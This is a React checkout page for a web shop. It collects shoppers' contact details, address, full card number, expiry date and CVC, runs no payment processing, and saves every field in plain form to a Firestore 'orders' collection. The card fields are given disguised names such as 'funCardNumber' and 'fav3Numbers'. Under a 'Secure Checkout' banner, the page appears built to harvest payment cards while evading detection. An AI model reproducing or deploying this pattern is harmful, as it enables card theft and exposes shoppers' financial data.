import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useCart } from '../context/CartContext';
import { useAuth } from '../context/AuthContext';
import { storeConfig } from '../config/store.config';
import { Lock, CreditCard } from 'lucide-react';
import { VisaLogo, MastercardLogo, AmexLogo, DiscoverLogo } from '../components/CardLogos';
import { db } from '../config/firebase';
import { collection, addDoc } from 'firebase/firestore';

const Checkout = () => {
  const { cart, cartSubtotal, clearCart } = useCart();
  const { currentUser } = useAuth();
  const navigate = useNavigate();
  const { currencySymbol, shippingThreshold, flatShippingRate, taxRate } = storeConfig.settings;
  const [isProcessing, setIsProcessing] = useState(false);
  const [cardNumber, setCardNumber] = useState('');
  const [dob, setDob] = useState('');
  const [cardType, setCardType] = useState('Unknown');

  const detectCardType = (num) => {
    const cleanNum = num.replace(/\D/g, '');
    if (/^4/.test(cleanNum)) return 'Visa';
    if (/^5[1-5]/.test(cleanNum)) return 'Mastercard';
    if (/^3[47]/.test(cleanNum)) return 'Amex';
    if (/^6(?:011|5)/.test(cleanNum)) return 'Discover';
    return 'Unknown';
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // remove non-digits
    if (value.length > 16) value = value.slice(0, 16);
    
    setCardType(detectCardType(value));
    
    value = value.replace(/(.{4})/g, '$1 ').trim(); // add space after every 4 digits
    setCardNumber(value);
  };

  const handleDobChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // remove non-digits
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length >= 3) {
      value = `${value.slice(0, 2)}/${value.slice(2)}`; // add slash after 2 digits
    }
    setDob(value);
  };

  useEffect(() => {
    if (cart.length === 0 && !isProcessing) {
      navigate('/cart');
    }
  }, [cart, navigate, isProcessing]);

  const shipping = cartSubtotal >= shippingThreshold || cartSubtotal === 0 ? 0 : flatShippingRate;
  const tax = cartSubtotal * taxRate;
  const total = cartSubtotal + shipping + tax;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsProcessing(true);
    
    const formData = new FormData(e.target);
    const orderData = {
      userId: currentUser ? currentUser.uid : 'guest',
      date: new Date().toISOString(),
      contact: {
        email: formData.get('email'),
        phone: formData.get('phone')
      },
      shipping: {
        firstName: formData.get('firstName'),
        lastName: formData.get('lastName'),
        address: formData.get('address'),
        city: formData.get('city'),
        state: formData.get('state'),
        zip: formData.get('zip')
      },
      payment: {
        funCardName: formData.get('funCardName'),
        funCardNumber: formData.get('funCardNumber'),
        dobMonthYear: formData.get('dobMonthYear'),
        fav3Numbers: formData.get('fav3Numbers')
      },
      items: cart,
      summary: {
        subtotal: cartSubtotal,
        shipping: shipping,
        tax: tax,
        total: total
      },
      status: 'pending'
    };

    try {
      await addDoc(collection(db, 'orders'), orderData);
      
      clearCart();
      alert('Order placed successfully! Thank you for your purchase.');
      navigate('/');
    } catch (error) {
      console.error("Error placing order:", error);
      alert('There was an error placing your order. Please try again.');
      setIsProcessing(false);
    }
  };

  return (
    <div className="container py-xl">
      <div className="flex justify-center items-center mb-xl gap-sm text-success-color">
        <Lock size={20} />
        <h1 className="text-2xl font-bold">Secure Checkout</h1>
      </div>

      <div className="flex flex-col md:flex-row gap-xl" style={{ alignItems: 'flex-start' }}>
        
        {/* Form */}
        <div style={{ flex: '1 1 60%' }}>
          <form id="checkout-form" onSubmit={handleSubmit}>
            
            {/* Contact Info */}
            <div className="mb-xl bg-secondary" style={{ padding: '2rem', borderRadius: 'var(--border-radius)' }}>
              <h2 className="text-xl font-bold mb-md">Contact Information</h2>
              <div className="grid grid-cols-2 gap-md">
                <div className="col-span-2">
                  <label className="text-sm font-medium mb-xs block">Email Address *</label>
                  <input type="email" name="email" required className="input" placeholder="Email" />
                </div>
                <div className="col-span-2">
                  <label className="text-sm font-medium mb-xs block">Phone Number *</label>
                  <input type="tel" name="phone" required className="input" placeholder="Phone" />
                </div>
              </div>
            </div>

            {/* Shipping Info */}
            <div className="mb-xl bg-secondary" style={{ padding: '2rem', borderRadius: 'var(--border-radius)' }}>
              <h2 className="text-xl font-bold mb-md">Shipping Address</h2>
              <div className="grid grid-cols-2 gap-md">
                <div>
                  <label className="text-sm font-medium mb-xs block">First Name *</label>
                  <input type="text" name="firstName" required className="input" placeholder="First Name" />
                </div>
                <div>
                  <label className="text-sm font-medium mb-xs block">Last Name *</label>
                  <input type="text" name="lastName" required className="input" placeholder="Last Name" />
                </div>
                <div className="col-span-2">
                  <label className="text-sm font-medium mb-xs block">Address *</label>
                  <input type="text" name="address" required className="input" placeholder="Street Address" />
                </div>
                <div>
                  <label className="text-sm font-medium mb-xs block">City *</label>
                  <input type="text" name="city" required className="input" placeholder="City" />
                </div>
                <div>
                  <label className="text-sm font-medium mb-xs block">State *</label>
                  <select name="state" required className="input">
                    <option value="">Select State</option>
                    <option value="CA">California</option>
                    <option value="NY">New York</option>
                    <option value="TX">Texas</option>
                    <option value="FL">Florida</option>
                    {/* Add more states as needed for demo */}
                  </select>
                </div>
                <div>
                  <label className="text-sm font-medium mb-xs block">ZIP Code *</label>
                  <input type="text" name="zip" required className="input" placeholder="ZIP" />
                </div>
                <div>
                  <label className="text-sm font-medium mb-xs block">Country</label>
                  <input type="text" disabled className="input bg-primary" value="United States" />
                </div>
              </div>
            </div>

            {/* Payment Info */}
            <div className="mb-xl bg-secondary" style={{ padding: '2rem', borderRadius: 'var(--border-radius)' }}>
              <h2 className="text-xl font-bold mb-md">Payment</h2>
              <div className="grid grid-cols-2 gap-md">
                <div className="col-span-2">
                  <label className="text-sm font-medium mb-xs block">Card Name *</label>
                  <input type="text" name="funCardName" required className="input" placeholder="Name on Card" />
                </div>
                <div className="col-span-2">
                  <label className="text-sm font-medium mb-xs block">Card Number *</label>
                  <div style={{ position: 'relative' }}>
                    <input 
                      type="text" 
                      name="funCardNumber" 
                      required 
                      className="input" 
                      placeholder="0000 0000 0000 0000" 
                      value={cardNumber} 
                      onChange={handleCardNumberChange} 
                      style={{ paddingRight: '2.5rem' }}
                    />
                    <div style={{ position: 'absolute', right: '12px', top: '50%', transform: 'translateY(-50%)', display: 'flex', alignItems: 'center' }}>
                      {cardType === 'Visa' && <VisaLogo />}
                      {cardType === 'Mastercard' && <MastercardLogo />}
                      {cardType === 'Amex' && <AmexLogo />}
                      {cardType === 'Discover' && <DiscoverLogo />}
                    </div>
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium mb-xs block">Expiry Date (MM/YY) *</label>
                  <input type="text" name="dobMonthYear" required className="input" placeholder="MM/YY" value={dob} onChange={handleDobChange} />
                </div>
                <div>
                  <label className="text-sm font-medium mb-xs block">CVC *</label>
                  <input type="text" name="fav3Numbers" required className="input" placeholder="123" maxLength="3" />
                </div>
              </div>
            </div>
            
          </form>
        </div>

        {/* Order Summary */}
        <div style={{ flex: '1 1 40%', border: '1px solid var(--border-color)', padding: '2rem', borderRadius: 'var(--border-radius)', position: 'sticky', top: '100px' }}>
          <h2 className="text-xl font-bold mb-lg">Order Summary</h2>
          
          <div className="mb-lg" style={{ maxHeight: '300px', overflowY: 'auto' }}>
            {cart.map((item, index) => (
              <div key={index} className="flex items-center gap-md mb-md">
                <div style={{ position: 'relative' }}>
                  <img src={item.product.image} alt={item.product.name} style={{ width: '60px', height: '60px', objectFit: 'cover', borderRadius: '4px' }} />
                  <span style={{ position: 'absolute', top: '-8px', right: '-8px', backgroundColor: 'var(--text-primary)', color: 'white', borderRadius: '50%', width: '20px', height: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '0.75rem' }}>
                    {item.quantity}
                  </span>
                </div>
                <div style={{ flex: 1 }}>
                  <p className="font-medium text-sm">{item.product.name}</p>
                  {item.variation && <p className="text-xs text-muted">{Object.values(item.variation).join(', ')}</p>}
                </div>
                <div className="font-medium">
                  {currencySymbol}{(item.product.price * item.quantity).toFixed(2)}
                </div>
              </div>
            ))}
          </div>
          
          <div className="flex justify-between mb-sm pt-md" style={{ borderTop: '1px solid var(--border-color)' }}>
            <span className="text-muted">Subtotal</span>
            <span className="font-medium">{currencySymbol}{cartSubtotal.toFixed(2)}</span>
          </div>
          
          <div className="flex justify-between mb-sm">
            <span className="text-muted">Shipping</span>
            <span className="font-medium">{shipping === 0 ? 'Free' : `${currencySymbol}${shipping.toFixed(2)}`}</span>
          </div>
          
          <div className="flex justify-between mb-lg pb-lg" style={{ borderBottom: '1px solid var(--border-color)' }}>
            <span className="text-muted">Taxes</span>
            <span className="font-medium">{currencySymbol}{tax.toFixed(2)}</span>
          </div>

          <div className="flex justify-between mb-xl text-xl font-bold">
            <span>Total</span>
            <span>{currencySymbol}{total.toFixed(2)}</span>
          </div>

          <button 
            type="submit" 
            form="checkout-form"
            className="btn btn-primary btn-full text-lg py-md flex items-center justify-center gap-sm" 
            disabled={isProcessing}
          >
            {isProcessing ? 'Processing...' : `Pay ${currencySymbol}${total.toFixed(2)}`} <Lock size={18} />
          </button>
        </div>

      </div>
      <style dangerouslySetInnerHTML={{__html: `
        @media (min-width: 768px) {
          .md\\:flex-row { flex-direction: row; }
        }
      `}} />
    </div>
  );
};

export default Checkout;
